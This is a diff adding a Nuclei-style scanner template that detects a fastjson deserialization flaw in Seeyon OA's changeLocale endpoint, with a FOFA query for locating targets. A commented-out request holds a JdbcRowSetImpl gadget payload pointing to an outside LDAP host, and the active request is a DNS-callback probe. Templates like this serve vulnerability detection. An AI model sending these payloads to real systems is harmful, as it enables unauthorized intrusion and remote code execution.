@@ -1,0 +1,69 @@
+id: poc-local-oa-seeyon-changeLocale-fastjson-rce
+
+info:
+  name: 致远OA-changeLocale-fastjson反序列化漏洞
+  author: capiton
+  severity: critical
+  description: 致远OA-changeLocale-fastjson反序列化漏洞
+  reference:
+    - 
+  metadata:
+    fofa-query: app="致远互联-OA"
+    Vulnerability-Impact: unknown
+  tags: seeyon,zhiyuan
+
+requests:
+  # - raw:
+  #     - |-
+  #       POST /seeyon/main.do?method=changeLocale HTTP/1.1
+  #       Host: {{Hostname}}
+  #       Content-Type: application/json
+
+  #       {
+
+  #           "a":{
+
+  #               "@type":"java.lang.Class",
+
+  #               "val":"com.sun.rowset.JdbcRowSetImpl"
+
+  #           },
+
+  #           "b":{
+
+  #               "@type":"com.sun.rowset.JdbcRowSetImpl",
+
+  #               "dataSourceName":"ldap://{{interactsh-url}}",
+
+  #               "autoCommit":true
+
+  #           }
+
+  #       }
+
+  - raw:
+      - |-
+        POST /seeyon/main.do?method=changeLocale HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _json_params={"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"  # Confirms the DNS Interaction
+
+    #   - type: regex
+    #     part: interactsh_request
+    #     regex:
+    #       - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    # extractors:
+    #   - type: regex
+    #     part: interactsh_request
+    #     group: 1
+    #     regex:
+    #       - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
